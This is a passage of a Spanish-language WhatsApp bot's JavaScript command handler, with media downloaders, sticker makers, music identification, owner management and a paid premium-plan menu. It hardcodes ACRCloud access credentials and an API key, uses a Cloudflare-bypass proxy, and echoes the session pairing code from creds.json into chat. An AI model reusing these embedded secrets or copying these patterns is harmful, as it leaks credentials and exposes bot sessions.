let editedThumb = await Jimp.read(thumbBuffer);
editedThumb.resize(200, 150);
let editedThumbBuffer = await editedThumb.getBufferAsync(Jimp.MIME_JPEG);

let caption = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Youtube Mp4\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮

˖✿  *Título* : ${videoResult.response.titulo || video.title || 'desconocido'}
˖✿  *Tamaño* : ${fileSize || 'desconocido'}
˖✿  *Duración* : ${video.timestamp || 'desconocido'}
˖✿  *Calidad* : ${quality || 'desconocido'}p

> ʙʏ ᴇʟɪᴀsᴀʀʏᴛ
`;

await conn.sendMessage(m.chat, {
video: { url: videoResult.response.descarga },
mimetype: 'video/mp4',
caption: caption,
jpegThumbnail: editedThumbBuffer
}, { quoted: m });

} catch (err) {
console.error("Error en el comando 'play3':", err);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error:\n\n\`\`\`${err.stack}\`\`\``);
}
break;
}
case 'sc':
case 'soundcloud': {
  if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa la URL o nombre de la canción de SoundCloud`);
  const { Client } = require('soundcloud-scraper');
  const client = new Client();
  let trackUrl = text;
  if (!text.includes('soundcloud.com')) {
    const results = await client.search(text, "track", { limit: 1 });
    if (!results.length) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se encontró ningún resultado`);
    trackUrl = results[0].url;
  }
  const apiURL = `https://api.siputzx.my.id/api/d/soundcloud?url=${encodeURIComponent(trackUrl)}`;
  const apiRes = await axios.get(apiURL);
  if (!apiRes.data.status) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudieron obtener los datos`);
  const data = apiRes.data.data;
  await conn.sendMessage(m.chat, { 
      image: { url: data.thumbnail }, 
      caption: `${SetEmoji[userSender] || SetEmoji.default} *${data.title}*\n\n🔗 *Link:* ${trackUrl}\n\n🎵 *Descargando audio...*` 
    }, { quoted: m });
  const audioRes = await axios.get(data.url, { responseType: 'arraybuffer' });
  const audioBuffer = Buffer.from(audioRes.data);
  await conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
}
break;
case 'waifu': {
conn.sendMessage(m.chat, {
  image: { url: 'https://api.siputzx.my.id/api/r/waifu' },
  caption: `${SetEmoji[userSender] || SetEmoji.default} waifu.`
});
}
break;
case "reactch": { if (!isOwner) return m.reply("Solo el propietario puede usar esta función.");

const args = body.trim().split(/ +/);
if (args.length < 3) return m.reply("Formato incorrecto. Usa: .reactch <id_canal> <id_mensaje> <emoji>");

const channelId = args[1];
const messageId = args[2];
const emoji = args.slice(3).join(" ");

try {
    await conn.newsletterReactMessage(channelId, messageId, emoji);
    m.reply(`Reacción ${emoji} enviada con éxito al mensaje ${messageId} en el canal ${channelId}.`);
} catch (error) {
    console.error("Error al enviar la reacción:", error);
    m.reply("No se pudo enviar la reacción. Verifica los IDs del canal y del mensaje.");
}
break;

}
/*case 'serbot': {
  const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    DisconnectReason
  } = require("@whiskeysockets/baileys");
  const { Boom } = require("@hapi/boom");
  const path = require("path");
  const pino = require("pino");
  const fs = require("fs");
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

  async function serbot() {
    try {
      const number = m.key?.participant || m.key.remoteJid;
      const file = path.join(__dirname, "subbots", number);
      const rid = number.split("@")[0];
      const activeBotsFile = path.join(__dirname, "activeBots.json");
      let activeBots = fs.existsSync(activeBotsFile)
        ? JSON.parse(fs.readFileSync(activeBotsFile, "utf8"))
        : [];
      let botActive = activeBots.find(bot => bot.number === number);
      let sessionExists = fs.existsSync(file);
      if (botActive) {
        await conn.sendMessage(m.chat, { text: `✅ *Tienes una conexión activa, no te preocupes.*` }, { quoted: m });
        return;
      } else if (sessionExists && !botActive) {
        if (!global.reconnectingBots) global.reconnectingBots = {};
        if (!global.reconnectingBots[number]) {
          global.reconnectingBots[number] = true;
          await conn.sendMessage(m.chat, { text: `⚠️ *Ya tienes una conexión pero está off. Reconectando inmediatamente...*` }, { quoted: m });
        }
      }
      const { state, saveCreds } = await useMultiFileAuthState(file);
      const { version } = await fetchLatestBaileysVersion();
      const logger = pino({ level: "silent" });
      const sock = makeWASocket({
        version,
        logger,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) }
      });
      let codeSent = false;
      let botConnected = false;
      let messageSent = false;
      let closeHandled = false;
      let timeoutFired = false;
      const connectionUpdateHandler = async (update) => {
        if (timeoutFired) return;
        const { qr, connection, lastDisconnect } = update;
        if (qr && !codeSent && !timeoutFired) {
          await conn.fakeReply(m.chat, `*generando sesión...*`, '0@s.whatsapp.net', 'espera unos segundos....');
          const code = await sock.requestPairingCode(rid);
          await sleep(5000);
          await conn.relayMessage(m.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: `🔐 Código generado:\n\`\`\`${code}\`\`\`\n\nAbre WhatsApp > Vincular dispositivo y pega el código.`
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_copy",
                      buttonParamsJson: JSON.stringify({ display_text: "Copiar", copy_code: code })
                    }],
                    messageParamsJson: ""
                  }
                }
              }
            }
          }, {});
          codeSent = true;
        }
        if (connection === "close" && !closeHandled) {
          closeHandled = true;
          let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
          clearTimeout(connectionTimeout);
          sock.ev.off("connection.update", connectionUpdateHandler);
          if (reason === DisconnectReason.loggedOut) {
            fs.rmSync(file, { recursive: true, force: true });
            activeBots = activeBots.filter(bot => bot.number !== number);
            fs.writeFileSync(activeBotsFile, JSON.stringify(activeBots, null, 2));
            await conn.sendMessage(m.chat, { text: `❌ Sesión cerrada permanentemente: ${DisconnectReason[reason]} (${reason})` }, { quoted: m });
          } else {
            await sleep(5000);
            await serbot();
          }
        }
        if (connection === "open" && !botConnected && !timeoutFired) {
          clearTimeout(connectionTimeout);
          sock.ev.off("connection.update", connectionUpdateHandler);
          botConnected = true;
          if (!messageSent) {
            await conn.sendMessage(m.chat, { text: "✅ *Subbot conectado correctamente.*" }, { quoted: m });
            messageSent = true;
          }
          if (!botActive) {
            activeBots = activeBots.filter(bot => bot.number !== number);
            activeBots.push({ name: pushname, number: number, startTime: new Date().toISOString() });
            fs.writeFileSync(activeBotsFile, JSON.stringify(activeBots, null, 2));
          }
          sock.ev.on("messages.upsert", async (update) => {
            let singleMsg = update.messages[0];
            let context = smsg(sock, singleMsg);
            let msgText = singleMsg.message?.conversation || singleMsg.message?.extendedTextMessage?.text || "";
            if (/^\.?eliasar(?:yt)?$/i.test(msgText.trim())) {
              await m.reply('Hola :)');
              return;
            }
            require("./main")(sock, context, update, singleMsg);
          });
        }
      };
      sock.ev.on("connection.update", connectionUpdateHandler);
      const connectionTimeout = setTimeout(async () => {
        if (!botConnected && !timeoutFired) {
          timeoutFired = true;
          sock.ev.off("connection.update", connectionUpdateHandler);
          if (sock?.ws) sock.ws.close();
          fs.rmSync(file, { recursive: true, force: true });
          await conn.sendMessage(m.chat, { text: `❌ La sesión no se abrió, borrando credenciales.` }, { quoted: m });
        }
      }, 60000);
      sock.ev.on("creds.update", saveCreds);
    } catch (e) {
      await conn.sendMessage(m.chat, { text: `❌ *Error inesperado:* ${e.message}` }, { quoted: m });
    }
  }
  await serbot();
  break;
}
case 'bots': {
  const path = require("path");
  const fs = require("fs");

  const activeBotsFile = path.join(__dirname, "activeBots.json");
  if (!fs.existsSync(activeBotsFile)) {
    await conn.sendMessage(m.chat, { text: "There are no active bots at the moment." }, { quoted: m });
    break;
  }

  const activeBots = JSON.parse(fs.readFileSync(activeBotsFile, "utf8"));
  if (activeBots.length === 0) {
    await conn.sendMessage(m.chat, { text: "There are no active bots at the moment." }, { quoted: m });
    break;
  }

  let response = "Active Bots List:\n\n";

  activeBots.forEach(bot => {
    const startTime = new Date(bot.startTime);
    const uptime = Math.floor((Date.now() - startTime.getTime()) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = uptime % 60;
    const uptimeString = `${hours}h ${minutes}m ${seconds}s`;

  const formattedNumber = bot.number.replace(/(\d{4})\d+(\d{3})(@.*)/, "$1Xxxx$2@eliasaryt.pro");

    response += `Name: ${bot.name}\n`;
    response += `Number: ${formattedNumber}\n`;
    response += `Start Time: ${startTime.toLocaleString()}\n`;
    response += `Uptime: ${uptimeString}\n\n`;
  });

  await conn.sendMessage(m.chat, { text: response.trim() }, { quoted: m });
  break;
}*/
/*case 'code':
case 'serbot':
case 'jadibot': {
  if (m.jadibotExecuted) break;
  m.jadibotExecuted = true;
  const args = m.text.split(" ").slice(1);
  function isBase64(str) {
    return /^[A-Za-z0-9+/=]+$/.test(str) && str.length % 4 === 0;
  }
  if (!args[0] || !isBase64(args[0])) {
    if (!args.includes('--code')) args.unshift('--code');
  }
  await require('./jadibot.js').jadibot(conn, m, command, '', args, m.sender);
  break;
}
case 'bots':
case 'listbots': {
const user = [...new Set([...global.listJadibot.filter((conn) => conn.user && conn.ws.socket && conn.ws.socket.readyState !== ws.CLOSED).map((conn) => conn)])];
const message = user.map((v, index) => {
let mode = global.publicMode ? 'Public' : 'Private';
const visibleNumber = v.user.jid.replace(/[^0-9]/g, '');
const maskedNumber = visibleNumber.substring(0, visibleNumber.length - 4) + 'Xxxx' + visibleNumber.slice(-4);
return `
[${index + 1}] Name: ${v.user.name || '•'}
Number: ${maskedNumber}`;
}).join('\n\n');
const replyMessage = message.length === 0 ? '' : message;
const totalUsers = user.length;
const responseMessage = `✦ *Sub Bots Connected:* ${totalUsers || '0'}\n\n${replyMessage.trim()}`.trim();
await conn.sendMessage(m.chat, {
text: responseMessage,
mentions: conn.parseMention(responseMessage)
}, {
quoted: m,
ephemeralExpiration: 24 * 60 * 100,
disappearingMessagesInChat: 24 * 60 * 100
});
break;
}
case 'killjadibot': {
await require('./jadibot.js').killJadibot(conn, m, command, '', m.sender)
break
}*/
case 'mediafire': {
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const Jimp = require('jimp');

if (!isPremium(userSender)) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Este comando es solo para usuarios premium.`);

let mediafireUrl = text || (m.quoted && m.quoted.text ? m.quoted.text.trim() : null);
if (!mediafireUrl) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un enlace de MediaFire o responde a un mensaje con un enlace.`);
if (!mediafireUrl.includes('mediafire.com')) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} El enlace no es válido.`);

await m.reply(`${SetEmoji[userSender] || SetEmoji.default} Descargando el archivo, espera un momento...`);

try {
let downloadLink, fileName;

try {
const response = await axios.get(`https://fgsi1-restapi.hf.space/api/tools/bypasscf?url=${encodeURIComponent(mediafireUrl)}`);
if (response.data.status && response.data.data && response.data.data.data.markdown) {
const markdown = response.data.data.data.markdown;
const downloadLinkMatch = markdown.match(/https:\/\/download[^\s]+/);
if (downloadLinkMatch) {
downloadLink = downloadLinkMatch[0];
fileName = path.basename(new URL(downloadLink).pathname);
}
}
} catch (error) {}

if (!downloadLink) {
const backupResponse = await axios.get(`https://exonity.tech/api/dl/mediafire?url=${encodeURIComponent(mediafireUrl)}`);
if (backupResponse.data.status === 200 && backupResponse.data.result.download) {
downloadLink = backupResponse.data.result.download;
fileName = backupResponse.data.result.filename.trim() || path.basename(new URL(downloadLink).pathname);
} else {
const carisysResponse = await axios.get(`https://carisys.online/api/downloads/mediafire/dl?url=${encodeURIComponent(mediafireUrl)}`);
if (carisysResponse.data.status === true && carisysResponse.data.result.url) {
downloadLink = carisysResponse.data.result.url;
fileName = carisysResponse.data.result.nome.trim() || path.basename(new URL(downloadLink).pathname);
} else {
return m.reply('No se pudo obtener el enlace de descarga con ninguna API.');
}
}
}

const filePath = path.join(__dirname, 'tmp', fileName);
const fileResponse = await axios({ url: downloadLink, method: 'GET', responseType: 'stream' });

const writer = fs.createWriteStream(filePath);
fileResponse.data.pipe(writer);

writer.on('finish', async () => {
writer.close();

if (!fs.existsSync(filePath)) return m.reply('Hubo un problema al descargar el archivo.');

const stats = fs.statSync(filePath);
const fileSizeInMB = stats.size / (1024 * 1024);
if (fileSizeInMB > 400) return m.reply('El archivo es demasiado grande. El límite es de 400 MB.');

const thumbnailBuffer = await Jimp.read('https://i.ibb.co/00pxgBn/b8cbf8dcab38.jpg')
.then(image => image.resize(250, 250).getBufferAsync(Jimp.MIME_JPEG));

await conn.sendMessage(m.chat, {
document: { url: filePath },
mimetype: 'application/octet-stream',
fileName: fileName,
jpegThumbnail: thumbnailBuffer
}, { quoted: m });

fs.unlink(filePath, (err) => {
if (err) console.error(`Error al eliminar el archivo: ${err.message}`);
});
});

writer.on('error', (error) => m.reply(`Hubo un error al descargar el archivo: ${error.message}`));
} catch (error) {
m.reply(`Hubo un error en la solicitud: ${error.message}`);
}
break;
}
case 'play': {
const { ytsinfo, ytinfo } = require('./scrapers/scraper.js');

if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa el nombre de la canción o el enlace de YouTube.`);
await m.react('🕐');
try {
let video;
if (text.startsWith('https://youtu.be/') || text.startsWith('https://www.youtube.com/')) {
let videoData = await ytinfo.url(text);
if (!videoData.status) {
await m.react('❌');
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se encontraron resultados.`);
}
video = videoData.result;
} else {
let searchResult = await ytsinfo.search(text);
if (!searchResult.status) {
await m.react('❌');
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se encontraron resultados.`);
}
video = searchResult.result;
}

let durationParts = video.duration.match(/PT(\d+H)?(\d+M)?(\d+S)?/);
let hours = durationParts[1] ? parseInt(durationParts[1].replace('H', '')) : 0;
let minutes = durationParts[2] ? parseInt(durationParts[2].replace('M', '')) : 0;
let seconds = durationParts[3] ? parseInt(durationParts[3].replace('S', '')) : 0;

let totalMinutes = hours * 60 + minutes + (seconds / 60);

let quality = 320;
if (totalMinutes >= 2) quality = 256;
if (totalMinutes >= 3) quality = 192;
if (totalMinutes >= 4) quality = 128;
if (totalMinutes >= 5) quality = 96;
if (totalMinutes >= 6) quality = 64;

let videoInfo = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Result Found\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮
˖✿  *Título* : ${video.title}
˖✿  *Duración* : ${video.duration.replace('PT', '').replace('H', 'h ').replace('M', 'm ').replace('S', 's')}
˖✿  *Vistas* : ${video.views}
˖✿  *Publicado* : ${video.published}
˖✿  *Canal* : ${video.channel}
˖✿  *Calidad* : ${quality} kbps
˖✿  *Link* : https://www.youtube.com/watch?v=${video.id}
> ʙʏ ᴇʟɪᴀsᴀʀʏᴛ`;

let thumbResponse = await fetch(video.img);
let buffer = await thumbResponse.arrayBuffer();
let image = await require('jimp').read(Buffer.from(buffer));
image.resize(250, 250);
let processedThumbnail = await image.getBufferAsync(require('jimp').MIME_JPEG);

await conn.sendMessage(m.chat, {
  image: { url: video.img },
  caption: videoInfo,
}, { quoted: m });

const { ytdown } = require('./scrapers/scraper.js');
let result = await ytdown.download(`https://www.youtube.com/watch?v=${video.id}`, 'mp3');
if (!result.status || !result.download) {
await m.react('❌');
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo descargar el audio.`);
}

let downloadUrl = result.download;
let fileSize = "Desconocido";
try {
let response = await fetch(downloadUrl, { method: 'HEAD' });
let contentLength = response.headers.get('content-length');
let sizeMB = contentLength ? parseInt(contentLength) / (1024 * 1024) : 0;
if (contentLength && sizeMB <= 0.012) throw new Error("Archivo demasiado pequeño.");
fileSize = contentLength ? `${sizeMB.toFixed(3)} MB` : "Desconocido";
} catch (err) {
console.warn("No se pudo obtener el tamaño del archivo.");
}

let caption = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Youtube Mp3\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮
˖✿  *Título* : ${video.title}
˖✿  *Tamaño* : ${fileSize}
˖✿  *Duración* : ${video.duration.replace('PT', '').replace('H', 'h ').replace('M', 'm ').replace('S', 's')}
˖✿  *Calidad* : ${quality} kbps
˖✿  *Sistema DL* : YTDown
> ʙʏ ᴇʟɪᴀsᴀʀʏᴛ`;

await conn.sendMessage(m.chat, {
document: { url: downloadUrl },
mimetype: 'audio/mpeg',
fileName: `${video.title}.mp3`,
jpegThumbnail: processedThumbnail,
caption: caption
}, { quoted: m });
} catch (err) {
await m.react('❌');
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error al procesar el comando.`);
}
break;
}
case 'play3': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa el nombre de la canción o el enlace de YouTube.`);

try {
let search = await yts(text);
if (!search.videos.length) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se encontraron resultados.`);

let video = search.videos[0];
let videoDuration = video.timestamp.split(':').map(Number);
let videoMinutes = videoDuration.length === 2 ? videoDuration[0] : videoDuration.length === 3 ? videoDuration[0] * 60 + videoDuration[1] : 0;

let quality = '1080';
if (videoMinutes > 28) quality = '144';
else if (videoMinutes > 20) quality = '240';
else if (videoMinutes > 15) quality = '360';
else if (videoMinutes > 6) quality = '480';
else if (videoMinutes > 2) quality = '720';

let videoInfo = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Resultado Encontrado\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮

˖✿  *Título* : ${video.title}
˖✿  *Duración* : ${video.timestamp}
˖✿  *Vistas* : ${video.views}
˖✿  *Publicado* : ${video.ago}
˖✿  *Canal* : ${video.author.name}
˖✿  *Calidad* : ${quality}p
˖✿  *Link* : ${video.url}

> ʙʏ ᴇʟɪᴀsᴀʀʏᴛ
`;

await conn.sendMessage(m.chat, {
image: { url: video.thumbnail },
caption: videoInfo
}, { quoted: m });

const { ogmp3, ytdown } = require('./scrapers/scraper');
let videoResult = await ogmp3.download(video.url, quality, 'video');

if (!videoResult.status) {
videoResult = await ytdown.download(video.url, quality);
if (!videoResult.status) 
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo obtener el video con ningún método. Error: ${videoResult.error}`);
}

let axios = require('axios');
let Jimp = require('jimp');

let fileSize = 'Desconocido';
try {
let headResponse = await axios.head(videoResult.response.download);
let contentLength = headResponse.headers['content-length'];
if (contentLength) {
fileSize = (contentLength / (1024 * 1024)).toFixed(2) + ' MB';
}
} catch {}

let thumbBuffer = await axios.get(video.thumbnail, { responseType: 'arraybuffer' })
.then(res => res.data)
.catch(() => null);

let editedThumb = await Jimp.read(thumbBuffer);
editedThumb.resize(200, 150);
let editedThumbBuffer = await editedThumb.getBufferAsync(Jimp.MIME_JPEG);

let caption = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Youtube Mp4\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮

˖✿  *Título* : ${videoResult.response.title || video.title}
˖✿  *Tamaño* : ${fileSize}
˖✿  *Duración* : ${video.timestamp}
˖✿  *Calidad* : ${quality}p

> ʙʏ ᴇʟɪᴀsᴀʀʏᴛ
`;

await conn.sendMessage(m.chat, {
video: { url: videoResult.response.download },
mimetype: 'video/mp4',
caption: caption,
jpegThumbnail: editedThumbBuffer
}, { quoted: m });

} catch (err) {
console.error("Error en el comando 'play3':", err);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error:\n\n\`\`\`${err.stack}\`\`\``);
}
break;
}
case 'brat': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un texto para generar el sticker.`);

try {
let apiUrl = `https://aqul-brat.hf.space/api/brat?text=${encodeURIComponent(text)}`;
let response = await fetch(apiUrl);
let buffer = await response.buffer();
let tempFilePath = `./tmp/${Math.random().toString(36).substring(7)}.webp`;
fs.writeFileSync(tempFilePath, buffer);

const d = new Date(new Date() + 3600000);
const locale = 'es-ES';
const dias = d.toLocaleDateString(locale, { weekday: 'long' });
const fecha = d.toLocaleDateString(locale, { day: '2-digit', month: '2-digit', year: 'numeric' });

let authorInfo = `{
"developer": "by EliasarYT",
"usuario": "${pushname}",
"fecha": "${fecha}",
"día": "${dias}"
}`;

await conn.sendImageAsSticker(m.chat, buffer, m, { 
packname: "",
author: authorInfo,
contextInfo: { 
forwardedNewsletterMessageInfo: { 
newsletterJid: '120363160031023229@newsletter', 
serverMessageId: '', 
newsletterName: 'INFINITY-WA 💫'
}, 
forwardingScore: 9999999,  
isForwarded: true, 
externalAdReply: { 
showAdAttribution: false, 
title: `𝑴𝒊𝒄𝒂𝑺𝒉𝒂𝒅𝒆 ${SetEmoji[userSender] || SetEmoji.default}`, 
mediaType: 2, 
sourceUrl: 'https://whatsapp.com/channel/0029VadxAUkKLaHjPfS1vP36', 
thumbnailUrl: FotosMenu[userSender] || FotosMenu.default
} 
} 
});

fs.unlinkSync(tempFilePath);
} catch (err) {
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Error al generar el sticker.`);
}
break;
}
case 'brat2': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un texto para generar el sticker.`);

try {
let apiUrl = `https://api.fgmods.xyz/api/maker/attp?text=${encodeURIComponent(text)}&apikey=foJRF6Py`;
let response = await fetch(apiUrl);
let buffer = await response.buffer();
let tempFilePath = `./tmp/${Math.random().toString(36).substring(7)}.webp`;
fs.writeFileSync(tempFilePath, buffer);

const d = new Date(new Date() + 3600000);
const locale = 'es-ES';
const dias = d.toLocaleDateString(locale, { weekday: 'long' });
const fecha = d.toLocaleDateString(locale, { day: '2-digit', month: '2-digit', year: 'numeric' });

let authorInfo = `{
"developer": "by EliasarYT",
"usuario": "${pushname}",
"fecha": "${fecha}",
"día": "${dias}"
}`;

await conn.sendVideoAsSticker(m.chat, buffer, m, { 
packname: "",
author: authorInfo,
contextInfo: { 
forwardedNewsletterMessageInfo: { 
newsletterJid: '120363160031023229@newsletter', 
serverMessageId: '', 
newsletterName: 'INFINITY-WA 💫'
}, 
forwardingScore: 9999999,  
isForwarded: true, 
externalAdReply: { 
showAdAttribution: false, 
title: `𝑴𝒊𝒄𝒂𝑺𝒉𝒂𝒅𝒆 ${SetEmoji[userSender] || SetEmoji.default}`, 
mediaType: 2, 
sourceUrl: 'https://whatsapp.com/channel/0029VadxAUkKLaHjPfS1vP36', 
thumbnailUrl: FotosMenu[userSender] || FotosMenu.default
} 
} 
});

fs.unlinkSync(tempFilePath);
} catch (err) {
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Error al generar el sticker.`);
}
break;
}
case 'quemusica':
case 'quemusicaes':
case 'whatmusic': {
const acrcloud = require('acrcloud');
const fs = require('fs');
const yts = require('yt-search');
const acr = new acrcloud({
host: 'identify-eu-west-1.acrcloud.com',
access_key: 'c33c767d683f78bd17d4bd4991955d81',
access_secret: 'bvgaIAEtADBTbLwiPGYlxupWqkNGIjT7J9Ag2vIu',
});

const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';

if (/audio|video/.test(mime)) {
if ((q.msg || q).seconds > 20) {
m.reply('⚠️ El archivo que carga es demasiado grande. Le sugerimos que lo corte a 10-20 segundos para identificarlo correctamente.');
break;
}

const media = await q.download();
const ext = mime.split('/')[1];
const tempFilePath = `./tmp/${m.sender}.${ext}`;
fs.writeFileSync(tempFilePath, media);

try {
const res = await acr.identify(fs.readFileSync(tempFilePath));
const { code, msg } = res.status;

if (code !== 0) {
throw msg;
}

const { title, artists, album, genres, release_date } = res.metadata.music[0];
const search = await yts(title);
const video = search.videos.length > 0 ? search.videos[0] : null;

const txt = `
𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎𝐒 𝐃𝐄 𝐋𝐀 𝐁𝐔𝐒𝐐𝐔𝐄𝐃𝐀

• 📌 𝐓𝐢𝐭𝐮𝐥𝐨: ${title}
• 👨‍🎤 𝐀𝐫𝐭𝐢𝐬𝐭𝐚: ${artists !== undefined ? artists.map((v) => v.name).join(', ') : 'No encontrado'}
• 💾 𝐀𝐥𝐛𝐮𝐦: ${album.name || 'No encontrado'}
• 🌐 𝐆𝐞𝐧𝐞𝐫𝐨: ${genres !== undefined ? genres.map((v) => v.name).join(', ') : 'No encontrado'}
• 📆 𝐅𝐞𝐜𝐡𝐚 𝐝𝐞 𝐥𝐚𝐧𝐳𝐚𝐦𝐢𝐞𝐧𝐭𝐨: ${release_date || 'No encontrado'}
• 🎬 𝐕𝐞𝐫 𝐞𝐧 𝐘𝐨𝐮𝐓𝐮𝐛𝐞: ${video ? video.url : 'No encontrado'}
`.trim();

if (!video) {
m.reply('⚠️ No se encontró ningún video relacionado en YouTube.');
return;
}

await conn.sendMessage(m.chat, {
image: { url: video.thumbnail },
caption: txt,
footer: "EliasarYT",
viewOnce: false,
headerType: 4,
mentions: [m.sender],
}, { quoted: m });

} catch (error) {
m.reply(`*⚠️ Error al identificar la música:* ${error}`);
} finally {
fs.unlinkSync(tempFilePath);
}
} else {
m.reply('*⚠️ Responde a un audio o video para identificar la música.*');
}
break;
}
case 'delowner': {
if (m.sender !== '50582340051@s.whatsapp.net') {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo el usuario autorizado puede eliminar owners.`);
}

const number = args.join('').replace(/\D/g, '');
if (number.length < 7) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Uso correcto: .delowner 50582340051`);

const config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
const index = config.owner.findIndex(([num]) => num === number);

if (index === -1) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} El número no está registrado como owner.`);

config.owner.splice(index, 1);
fs.writeFileSync(configPath, JSON.stringify(config, null, 2));

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Owner eliminado correctamente: ${number}`);
break;
}

case 'botones': {
conn.sendMessage(m.chat, { text: "ANSI-BOT", caption: "ANSIBOT", footer: "EliasarYT", buttons: [
{
buttonId: ".menu", 
buttonText: { 
displayText: 'menu' 
}
}, {
buttonId: ".test", 
buttonText: {
displayText: "test"
}
}
],
viewOnce: true,
headerType: 1,
}, { quoted: m })
break;
}

case 'addowner': {
if (!isCreator) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo el creador puede añadir nuevos owners.`);

const input = args.join(' ').trim();
const numberMatch = input.match(/(\+?\d[\d\s().-]*)/);
const name = input.replace(numberMatch ? numberMatch[0] : '', '').trim();

if (!numberMatch || !name) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Uso correcto: .addowner +505 XXXX Nombre`);

const cleanNumber = numberMatch[0].replace(/\D/g, '');
if (cleanNumber.length < 7) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} El número no es válido.`);

const config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
config.owner.push([cleanNumber, name, true]);
fs.writeFileSync(configPath, JSON.stringify(config, null, 2));

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Nuevo owner añadido:\n- Número: ${cleanNumber}\n- Nombre: ${name}`);
break;
}
case 'conprabot': {
global.rcanal = { 
contextInfo: { 
isForwarded: true,  
forwardingScore: 9999999,  
forwardedNewsletterMessageInfo: { 
newsletterJid: "120363307694217288@newsletter",  
serverMessageId: 100,  
newsletterName: 'conprabot',  
},  
externalAdReply: {  
showAdAttribution: true,  
renderLargerThumbnail: false,  
title: `${getBotName(userSender)} ${SetEmoji[userSender] || SetEmoji.default}`,  
mediaType: 2,  
sourceUrl: 'https://whatsapp.com/channel/0029VadxAUkKLaHjPfS1vP36',  
thumbnailUrl: FotosMenu[userSender] || FotosMenu.default  
}  
},
message: `
> ┏━━━━━━━━━━━━━💎  
> ┃  🎟️ Planes Premium  
> ┣━━━━━━━━━━━━━  
> ┃ ⏳ 10 días → $2 USD  
> ┃ ⏳ 20 días → $3.50 USD  
> ┃ ⏳ 35 días → $5 USD  
> ┃ ⏳ 70 días → $9 USD  
> ┃ ⏳ 105 días → $12 USD    
> ┣━━━━━━━━━━━━━  
> ┃ 🌟 Beneficios Exclusivos 🌟  
> ┃ 🔹 Cambia el nombre del bot  
> ┃ 🔹 Cambia la imagen principal del bot  
> ┃ 🔹 Cambia el emoji principal del bot  
> ┃ 🔹 Descargas más > pesadas  
> ┃ 🔹 Comandos exclusivos  
> ┃ 🔹 El bot en tu grupo 24/7  
> ┃ 🔹 El owner te da el número del bot  
> ┣━━━━━━━━━━━━━  
> ┃ 💳 Métodos de Pago:  
> ┃ ✅ PayPal: https://www.paypal.me/eliasarmoncada  
> ┃ ✅ WhatsApp: +1 (647) 558-4916  
> ┣━━━━━━━━━━━━━  
> ┃ 🤖 MicaShade 1.0.0 WhatsApp Bot (Private)  
> ┗━━━━━━━━━━━━━💎
`
};

let img = 'https://i.ibb.co/9kShbZnf/7ac0765f575b.jpg';
await conn.sendFile(m.chat, img, 'thumbnail.jpg', global.rcanal.message, m, null, global.rcanal);
break;
}
case 'menu': {
const pairingCode = JSON.parse(fs.readFileSync('./sessions/creds.json', 'utf8')).pairingCode;
let menuImage = FotosMenu[userSender] || FotosMenu.default;
let menuText = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`${getBotName(userSender)}\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮
⚘ MODE: *[${global.publicMode ? 'PUBLIC' : 'PRIVATE'}]*
⚘ SESSION: ${pairingCode}
⚘ EXECUTED COMMANDS: ${cmduse}
⚘ USER: ${pushname}

⚘ ÚNETE A NUESTRO PLAN PREMIUM Y DISFRUTA DE OPCIONES AVANZADAS.
⚘ MIRA LOS PRECIOS CON #conprabot ⇎

